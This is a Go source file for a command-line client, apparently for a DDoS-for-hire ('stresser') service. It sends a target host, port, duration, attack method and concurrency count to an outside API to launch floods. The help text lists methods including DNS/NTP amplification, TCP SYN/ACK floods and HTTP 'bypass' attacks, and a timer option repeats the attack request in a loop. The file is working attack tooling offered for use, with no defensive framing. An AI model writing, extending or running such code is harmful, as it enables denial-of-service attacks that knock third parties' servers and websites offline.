package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"time"
)

type Config struct {
	Token    string    `json:"token"`
	Commands []Command `json:"commands"`
}

type Command struct {
	Host       string    `json:"host"`
	Port       string    `json:"port"`
	Time       int       `json:"time"`
	Method     string    `json:"method"`
	Concurrent int       `json:"concurrent"`
	StartTime  time.Time `json:"start_time"`
	EndTime    time.Time `json:"end_time"`
}

type Response struct {
	Message string `json:"message"`
	Status  string `json:"status"`
}

func main() {
	configPath := "/home/" + os.Getenv("USER") + "/.sapi.json"

	_, err := os.Stat(configPath)
	if os.IsNotExist(err) {
		fmt.Print("Token: ")
		var token string
		fmt.Scanln(&token)

		config := Config{
			Token: strings.TrimSpace(token),
		}
		configBytes, err := json.Marshal(config)
		if err != nil {
			fmt.Println("Error: Failed to create configuration.")
			return
		}
		err = ioutil.WriteFile(configPath, configBytes, 0600)
		if err != nil {
			fmt.Println("Error: Failed to write configuration file.")
			return
		}
	} else if err != nil {
		fmt.Println("Error: Could not check configuration file.")
		return
	}

	configBytes, err := ioutil.ReadFile(configPath)
	if err != nil {
		fmt.Println("Error: Failed to read configuration file.")
		return
	}
	var config Config
	err = json.Unmarshal(configBytes, &config)
	if err != nil {
		fmt.Println("Error: Failed to parse configuration file.")
		return
	}

	args := os.Args[1:]
	if len(args) == 1 && args[0] == "show" {
		showCommands(config.Commands, false)
		return
	} else if len(args) == 2 && args[0] == "show" && args[1] == "log" {
		showCommands(config.Commands, true)
		return
	} else if len(args) != 5 && len(args) != 7 {
		fmt.Println("LW/Forky Api CLI")
		fmt.Println("> Methods:")
		fmt.Println("- Amplification")
		fmt.Println("| DNS, NTP, WSD, DVR, ARD, SADP")
		fmt.Println("- User Datagram")
		fmt.Println("| UDPPPS")
		fmt.Println("- Transmission Control")
		fmt.Println("| TCPMB, TCPSYN, TCPACK, TCPTFO")
		fmt.Println("- Layer3")
		fmt.Println("| IPRAND, ESP, GRE, FIVEM, VALVE")
		fmt.Println("- Special")
		fmt.Println("| OVHAMP, TCPBYPASS, TCPSOCKET")
		fmt.Println("- Layer 7 Methods")
		fmt.Println("| HTTPBYPASS, HTTPSv1, HTTPSv2")
		fmt.Println(" ")
		fmt.Println("Usage: ./scli <URL OR IP ADDRESS> <PORT> <TIME> <METHOD> <CONCURRENTS> [-timer <SECONDS>]")
		return
	}

	timeSeconds, err := strconv.Atoi(args[2])
	if err != nil {
		fmt.Println("Error: Invalid time.")
		return
	}

	concurrents, err := strconv.Atoi(args[4])
	if err != nil {
		fmt.Println("Error: Invalid concurrents.")
		return
	}

	url := fmt.Sprintf("https://darlingapi.com/?key=%s&host=%s&port=%s&time=%d&method=%s&concurrents=%d",
		config.Token, args[0], args[1], timeSeconds, args[3], concurrents)

	response, err := httpGet(url)
	if err != nil {
		fmt.Println("Error: Failed to send API request.")
		return
	}

	var jsonResponse Response
	err = json.Unmarshal(response, &jsonResponse)
	if err != nil {
		fmt.Println("Error: Failed to parse JSON response.")
		return
	}

	fmt.Println("Message:", jsonResponse.Message)

	if jsonResponse.Status == "success" {
		startTime := time.Now()
		endTime := startTime.Add(time.Duration(timeSeconds) * time.Second)

		for i := 0; i < concurrents; i++ {
			config.Commands = append(config.Commands, Command{
				Host:       args[0],
				Port:       args[1],
				Time:       timeSeconds,
				Method:     args[3],
				Concurrent: concurrents,
				StartTime:  startTime,
				EndTime:    endTime,
			})
		}

		configBytes, err = json.Marshal(config)
		if err != nil {
			fmt.Println("Error: Failed to update configuration.")
			return
		}
		err = ioutil.WriteFile(configPath, configBytes, 0600)
		if err != nil {
			fmt.Println("Error: Failed to write configuration file.")
			return
		}

		// Check if -timer option is provided
		if len(args) == 7 && args[5] == "-timer" {
			timerSeconds, err := strconv.Atoi(args[6])
			if err != nil {
				fmt.Println("Error: Invalid timer value.")
				return
			}

			go sendAPIRequest(url, timeSeconds, timerSeconds)
			waitForInterrupt()
		}
	}
}

func showCommands(commands []Command, showLog bool) {
	now := time.Now()
	for _, command := range commands {
		if command.EndTime.After(now) && command.Time > 0 {
			remainingTime := command.EndTime.Sub(now)
			fmt.Printf("%s:%s - %s - %d (Remaining Time: %s)\n", command.Host, command.Port, command.Method, command.Time, remainingTime)
		} else if showLog {
			fmt.Printf("%s:%s - %s - %d\n", command.Host, command.Port, command.Method, command.Time)
		}
	}
}

func httpGet(url string) ([]byte, error) {
	response, err := http.Get(url)
	if err != nil {
		return nil, err
	}
	defer response.Body.Close()

	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		return nil, err
	}

	return body, nil
}

func sendAPIRequest(url string, timeSeconds, timerSeconds int) {
	for {
		time.Sleep(time.Duration(timerSeconds) * time.Second)

		response, err := httpGet(url)
		if err != nil {
			fmt.Println("Error: Failed to send API request.")
			return
		}

		var jsonResponse Response
		err = json.Unmarshal(response, &jsonResponse)
		if err != nil {
			fmt.Println("Error: Failed to parse JSON response.")
			return
		}

		fmt.Println("Message:", jsonResponse.Message)
	}
}

func waitForInterrupt() {
	fmt.Println("Press Ctrl+C to stop.")
	ch := make(chan os.Signal, 1)
	signal.Notify(ch, os.Interrupt)
	<-ch
}
